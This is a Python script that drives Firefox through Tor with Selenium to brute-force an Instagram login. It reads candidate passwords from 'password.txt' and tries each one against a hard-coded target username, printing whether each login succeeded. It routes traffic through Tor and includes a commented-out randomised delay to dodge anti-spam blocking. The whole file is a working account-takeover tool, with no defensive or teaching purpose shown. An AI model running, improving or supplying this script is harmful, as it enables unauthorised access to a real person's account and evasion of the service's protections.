import time
from stem import Signal
from stem.control import Controller
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
import random


# Configure the Firefox options to use Tor as a proxy
tor_proxy = "socks5://localhost:9150"
firefox_options = Options()
firefox_options.add_argument('--proxy-server=%s' % tor_proxy)
# firefox_options.add_argument('--headless') uncomment this if you want to 

# Launch the Firefox webdriver
driver = webdriver.Firefox(options=firefox_options)

# Define the function to log in to Instagram
def login_to_instagram(username, password):
    
    # Get the Instagram login page
    driver.get("https://www.instagram.com/accounts/login/")
    time.sleep(2)
    
    # Find the username and password input fields and enter the login credentials
    username_input = driver.find_element(by='name', value='username')
    password_input = driver.find_element(by='name', value='password')
    username_input.send_keys(username)
    password_input.send_keys(password)
    
    # Click the login button
    login_button = driver.find_element(by='xpath', value="//button[@type='submit']")
    # Move to the login button element and click it using ActionChains
    action = ActionChains(driver)
    action.move_to_element(login_button).click().perform()
    
    # Wait for the page to load and check if login was successful
    # time.sleep(5)
    try:
        driver.find_element(by='xpath', value="//a[@href='/']//*[local-name()='svg' and @aria-label='Home']")
        print("Login successful!")
    except NoSuchElementException:
        print("Login unsuccessful.")

    # # Wait for a safe interval to avoid getting blocked by anti-spam measures
    # wait_time = random.randint(30, 60)
    # time.sleep(wait_time)    

# Try each password
with open('password.txt', 'r') as f:
    for line in f:
        password = line.strip()
        print(f"Trying password: {password}")
        login_to_instagram('kikomrn', password)

# Close the Firefox webdriver
driver.quit()
